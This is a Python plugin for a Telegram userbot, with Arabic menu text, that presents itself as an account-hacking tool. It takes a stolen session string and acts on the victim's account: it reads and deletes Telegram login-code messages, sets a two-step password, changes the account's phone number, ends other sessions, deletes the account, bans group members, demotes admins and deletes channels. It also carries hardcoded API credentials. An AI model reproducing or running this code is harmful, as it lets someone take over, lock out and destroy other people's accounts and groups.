import base64
import struct
import asyncio
import ipaddress
import requests as r
from traceback import format_exc
import os
import asyncio
import re
from os import system
from datetime import timedelta
from telethon import events, functions, types, Button, errors
from telethon.tl.types import ChannelParticipantsAdmins, ChannelParticipantAdmin, ChannelParticipantCreator
from telethon import TelegramClient as tg
from telethon.tl.functions.channels import GetAdminedPublicChannelsRequest as pc, JoinChannelRequest as join, LeaveChannelRequest as leave, DeleteChannelRequest as dc
from telethon.sessions import StringSession as ses
from telethon.tl.functions.auth import ResetAuthorizationsRequest as rt
import telethon
from telethon import functions
from telethon.tl.types import ChannelParticipantsAdmins as cpa
from telethon.tl.functions.channels import CreateChannelRequest as ccr, JoinChannelRequest as join

from telethon.events import CallbackQuery
from telethon.tl.functions.channels import GetParticipantRequest
from telethon.sessions.string import _STRUCT_PREFORMAT, CURRENT_VERSION, StringSession
from telethon.errors.rpcerrorlist import UserNotParticipantError, UserIsBlockedError

from . import bot, l313l
from ..Config import Config
from ..sql_helper.globals import addgvar, delgvar, gvarstatus

bot = borg = tgbot

Bot_Username = Config.TG_BOT_USERNAME or "sessionHackBot"
Zel_Uid = bot.uid

_PYRO_FORM = {351: ">B?256sI?", 356: ">B?256sQ?", 362: ">BI?256sQ?"}

DC_IPV4 = {
    1: "149.154.175.53",
    2: "149.154.167.51",
    3: "149.154.175.100",
    4: "149.154.167.91",
    5: "91.108.56.130",
}

async def change_number_code(strses, number, code, otp):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    bot = client = X
    try: 
      result = await bot(functions.account.ChangePhoneRequest(
        phone_number=number,
        phone_code_hash=code,
        phone_code=otp
      ))
      return True
    except:
      return False

async def change_number(strses, number):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    bot = client = X
    result = await bot(functions.account.SendChangePhoneCodeRequest(
        phone_number=number,
        settings=types.CodeSettings(
            allow_flashcall=True,
            current_number=True,
            allow_app_hash=True
        )
    ))
    return str(result)


async def userinfo(strses):
    async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
        k = await X.get_me()
        username = f"@{k.username}" if k.username else "None"
        TEXT = f"**ID =** {k.id}\n**NAME =** {k.first_name}\n**PHONE =** +{k.phone}\n**USERNAME =** {username}\n**DC_ID =** {X.session.dc_id}\n\n**- شكـراً لـ استخدامـك سـورس زدثــون ❤️** \n/hack"
        return TEXT

async def terminate(strses):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    await X(rt())

GROUP_LIST = []
async def delacc(strses):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    await X(functions.account.DeleteAccountRequest("I am chutia"))

async def promote(strses, grp, user):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    try:
      await X.edit_admin(grp, user, manage_call=True, invite_users=True, ban_users=True, change_info=True, edit_messages=True, post_messages=True, add_admins=True, delete_messages=True)
    except:
      await X.edit_admin(grp, user, is_admin=True, anonymous=False, pin_messages=True, title='Owner')
    
async def user2fa(strses):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    try:
      await X.edit_2fa('ali12345')
      return True
    except:
      return False

async def demall(strses, grp):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    async for x in X.iter_participants(grp, filter=ChannelParticipantsAdmins):
      try:
        await X.edit_admin(grp, x.id, is_admin=False, manage_call=False)
      except:
        await X.edit_admin(grp, x.id, manage_call=False, invite_users=False, ban_users=False, change_info=False, edit_messages=False, post_messages=False, add_admins=False, delete_messages=False)
      

def validate_session(session):
    # Telethon Session
    if session.startswith(CURRENT_VERSION):
        if len(session.strip()) != 353:
            return False
        return StringSession(session)

    # Pyrogram Session
    elif len(session) in _PYRO_FORM.keys():
        if len(session) in [351, 356]:
            dc_id, _, auth_key, _, _ = struct.unpack(
                _PYRO_FORM[len(session)],
                base64.urlsafe_b64decode(session + "=" *
                                         (-len(session) % 4)),
            )
        else:
            dc_id, _, _, auth_key, _, _ = struct.unpack(
                _PYRO_FORM[len(session)],
                base64.urlsafe_b64decode(session + "=" *
                                         (-len(session) % 4)),
            )
        return StringSession(CURRENT_VERSION + base64.urlsafe_b64encode(
            struct.pack(
                _STRUCT_PREFORMAT.format(4),
                dc_id,
                ipaddress.ip_address(DC_IPV4[dc_id]).packed,
                443,
                auth_key,
            )).decode("ascii"))
    else:
        return False

async def str_checker(strses):
    try:
        boot = tg(strses, 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2")
        await boot.connect()
        info = await boot.get_me()
        if info.bot:
            return False
        try:
            await boot(join('@u_gg_u'))
        except:
            pass
        await boot.disconnect()
        return True
    except Exception:
        return False

async def check_string(x):
    yy = await x.send_message("**- حسنـاً .. ارسـل كـود تيـرمكـس الآن**")
    try:
        xx = await x.get_response(timeout=300)
        await yy.delete()
    except terror:
        await x.send_message("**- عـذراً لقد انتهـى الوقـت .. حاول مجدداً**\n\n/hack")
        return False
    await xx.delete()
    strses = validate_session(xx.text)
    if strses:
        op = await str_checker(strses)
        if op:
            return strses
        else:
            await x.send_message("**- عـذراً .. لقد تم انهـاء جلسـة هـذا الكـود\n- من قبـل صاحب الحسـاب ؟!**\n\n/hack")
            return False
    else:
        await x.send_message('**-  كـود تيرمكـس غيـر صحيـح ؟!**')
        return False

        # Chat id/Username Func


async def joingroup(strses, username):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    await X(join(username))


async def leavegroup(strses, username):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    await X(leave(username))

async def delgroup(strses, username):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    await X(dc(username))
    

async def usermsgs(strses):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    i = ""
    
    async for x in X.iter_messages(777000, limit=3):
      i += f"\n{x.text}\n"
    await X.delete_dialog(777000)
    return str(i)


async def userbans(strses, grp):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    
    k = await X.get_participants(grp)
    for x in k:
      try:
        await X.edit_permissions(grp, x.id, view_messages=False)
      except:
        pass
    


async def userchannels(strses):
  async with tg(strses, 29308061, "462de3dfc98fd938ef9c6ee31a72d099") as X:
    k = await X(pc())
    i = ""
    for x in k.chats:
      try:
        i += f'\nCHANNEL NAME ~ {x.title} CHANNEL USRNAME ~ @{x.username}\n'
      except:
        pass
    return str(i)



import logging
logging.basicConfig(level=logging.WARNING)

channel = "ZThon"
menu = '''

A  ➠   ** تحقق من قنوات ومجموعات الحساب **

B  ➠  ** اضهار معلومات الحساب كالرقم والايدي والاسم....الخ**

C  ➠  ** لـحظر جميع اعضاء مجموعة او قنـاة صاحب الحسـاب**

D  ➠  ** تسجيل الدخول الى حساب المستخدم **

E  ➠  ** اشتراك بمجموعة او قناة معينة** 

F  ➠  ** مغادرة مجموعة او قناة معينة** 

G  ➠  ** حذف قناة او مجموعة **

H  ➠  ** التحقق اذا كان التحقق بخطوتين مفعل ام لا **

I   ➠  ** تسجيل الخروج من جميع الجلسات عدا جلسة البوت **

J  ➠  ** حذف الحساب نهائيا**

K  ➠  ** تنزيل جميع المشرفين من مجموعة معينة او قناة **

L  ➠  ** رفع مشرف لشخص معين في قناة او مجموعة **

M  ➠  ** تغييـر رقـم هـاتف الحسـاب **

'''
mm = '''
**- عليك الانضمـام في قنـاة السـورس اولاً**  @ZThon
'''

keyboard = [
  [  
    Button.inline("A", data="AAA"), 
    Button.inline("B", data="BBB"),
    Button.inline("C", data="CCC"),
    Button.inline("D", data="DDD"),
    Button.inline("E", data="EEE")
    ],
  [
    Button.inline("F", data="FFF"), 
    Button.inline("G", data="GGG"),
    Button.inline("H", data="HHH"),
    Button.inline("I", data="III"),
    Button.inline("J", data="JJJ"),
    ],
  [
    Button.inline("K", data="KKK"), 
    Button.inline("L", data="LLL"),
    Button.inline("M", data="MMM"),
    ],
  [
    Button.url("𝗭𝗧𝗵𝗼𝗻™ 𓅛", "https://t.me/ZThon")
    ]
]


@l313l.ar_cmd(pattern="هاك$")
async def op(event):
    zelzal = Bot_Username.replace("@","")       
    await event.edit(f"**- مرحبـا عـزيـزي\n\n- قم بالدخـول للبـوت المسـاعـد @{zelzal} \n- وارسـال الامـر  /hack**")

@tgbot.on(events.NewMessage(pattern="/hack", func = lambda x: x.is_private))
async def start(event):
  global menu
  if event.sender_id == bot.uid:
      async with bot.conversation(event.chat_id) as x:
        keyboard = [
          [  
            Button.inline("A", data="AAA"), 
            Button.inline("B", data="BBB"),
            Button.inline("C", data="CCC"),
            Button.inline("D", data="DDD"),
            Button.inline("E", data="EEE")
            ],
          [
            Button.inline("F", data="FFF"), 
            Button.inline("G", data="GGG"),
            Button.inline("H", data="HHH"),
            Button.inline("I", data="III"),
            Button.inline("J", data="JJJ")
            ],
          [
            Button.inline("K", data="KKK"), 
            Button.inline("L", data="LLL"),
            Button.inline("M", data="MMM"),
            ],
          [
            Button.url("𝗭𝗧𝗵𝗼𝗻™ 𓅛", "https://t.me/ZThon")
            ]
        ]
        await x.send_message(f"**- مرحبـاً بـك عـزيـزي\n- اليـك قائمـة اوامـر اختـراق الحسـاب عبـر كـود سيشـن تيرمكـس\n- اضغـط احـد الازرار للبـدء** \n\n{menu}", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"AAA")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
          return
      channels = await userchannels(string)
      if len(channels) == 0:
          await x.send_message("**- لا توجد قنوات او مجموعات عامة أنشأها هذا المستخدم**\n\n/hack")
      elif len(channels) > 2000:
          file_name = f"{e.chat_id}_session.txt"
          with open(file_name, "w") as f:
              f.write(channels + f"\n\n**- Details BY @{botname}**")
          await bot.send_file(event.chat_id, file_name)
          os.system(f"rm -rf {file_name}")
      else:
          await x.send_message(channels + "\n\n**- شكـراً لـ استخدامـك سـورس زدثــون ❤️** \n/hack")
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"BBB")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    string = await check_string(x)
    if not string:
        return
    i = await userinfo(string)
    await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس زدثــون ❤️**\n/hack", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"CCC")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    string = await check_string(x)
    if not string:
        return
    await x.send_message("**- حسنـاً .. ارسـل معـرف/ايـدي المجموعـة او القنـاة الآن**")
    grpid = await x.get_response()
    await userbans(string, grpid.text)
    await event.reply("**- جـارِ ... حظـر جميـع اعضـاء المجموعـة/القنـاة**", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"DDD")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
          return
      i = await usermsgs(string)
      await event.reply(i + "\n\n**- شكـراً لـ استخدامـك سـورس زدثــون ❤️**", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"EEE")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    string = await check_string(x)
    if not string:
        return
    await x.send_message("**- حسنـاً .. ارسـل معـرف/ايـدي المجموعـة او القنـاة الآن**")
    grpid = await x.get_response()
    await joingroup(string, grpid.text)
    await event.reply("**- لقد تم الانضمام الى القناة/الكروب**\n\n/hack")
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"FFF")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    string = await check_string(x)
    if not string:
      return
    await x.send_message("**- حسنـاً .. ارسـل معـرف/ايـدي المجموعـة او القنـاة الآن**")
    grpid = await x.get_response()
    await leavegroup(string, grpid.text)
    await event.reply("**- لقد تم مغادرة القناة/الكروب**\n\n/hack")
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"GGG")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
        return
      await x.send_message("**- حسنـاً .. ارسـل معـرف/ايـدي المجموعـة او القنـاة الآن**")
      grpid = await x.get_response()
      await delgroup(string, grpid.text)
      await event.reply("**- لقد تم حذف القناة/الكروب**\n\n/hack")
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"HHH")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
        return
      i = await user2fa(string)
      if i:
        await event.reply("**- صاحب الحسـاب لم يفعـل التحقق بخطـوتين\n- يمكنك الدخول الى الحساب بكل سهوله عبـر الامـر ( D )**\n\n/hack")
      else:
        await event.reply("**- عـذراً .. صاحب الحسـاب مفعـل التحقق بخطـوتين**")
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"III")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
        return
      i = await terminate(string)
      await event.reply("**- لقد تم انهـاء جميـع الجلسـات .. بنجـاح \n- ماعـدا جلسـة البـوت**")
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"JJJ")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
        return
      i = await delacc(string)
      await event.reply("**- تم حـذف الحسـاب .. بنجـاح ☠**\n\n/hack")
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"KKK")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
        return
      await x.send_message("**- حسنـاً .. ارسـل معـرف المجموعـة او القنـاة الآن**")
      grp = await x.get_response()
      await x.send_message("**- حسنـاً .. ارسـل المعـرف الآن**")
      user = await x.get_response()
      i = await promote(string, grp.text, user.text)
      await event.reply("**- جـارِ رفعـك مشـرفاً في المجمـوعـة/القنـاة**", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"LLL")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
        return
      await x.send_message("**- حسنـاً .. ارسـل معـرف المجموعـة او القنـاة الآن**")
      pro = await x.get_response()
      try:
        i = await demall(string, pro.text)
      except:
        pass
      await event.reply("**- تم تنزيـل مشـرفيـن المجمـوعـة/القنـاة .. بنجـاح \n- شكـراً لـ استخدامـك ســورس زدثــون**", buttons=keyboard)
      
@tgbot.on(events.callbackquery.CallbackQuery(data=re.compile(b"MMM")))
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      string = await check_string(x)
      if not string:
        return
      await x.send_message("**- حسنـاً .. ارسـل الرقم الذي تريـد تغييـر الحسـاب اليـه**\n[**ملاحظـه هامـه**]\n**- اذا استخدمت الارقام الوهميه لن تستطيـع الحصـول على الكـود **")
      number = (await x.get_response()).text
      try:
        result = await change_number(string, number)
        await event.respond(result + "\n\n **انسخ كـود رمز الهاتف وتحقق من رقمك الذي حصلت عليهotp**\n**توقف لمدة 20 ثانية ثـم انسخ رمز الهاتف الكـود و otp**")
        await asyncio.sleep(20)
        await x.send_message("**- حسنـاً .. ارسـل كـود الدخـول الآن**")
        phone_code_hash = (await x.get_response()).text
        await x.send_message("**- حسنـاً .. ارسـل كـود التحقق بخطـوتين الآن**")
        otp = (await x.get_response()).text
        changing = await change_number_code(string, number, phone_code_hash, otp)
        if changing:
          await event.respond("**- تم تغييـر الرقـم .. بنجـاح**✅")
        else:
          await event.respond("**هناك شي خطا**")
      except Exception as e:
        await event.respond(f"**- ارسل هذا الخطأ الى @zzzzl1l \n- الخطـأ** str(e)\n")
     
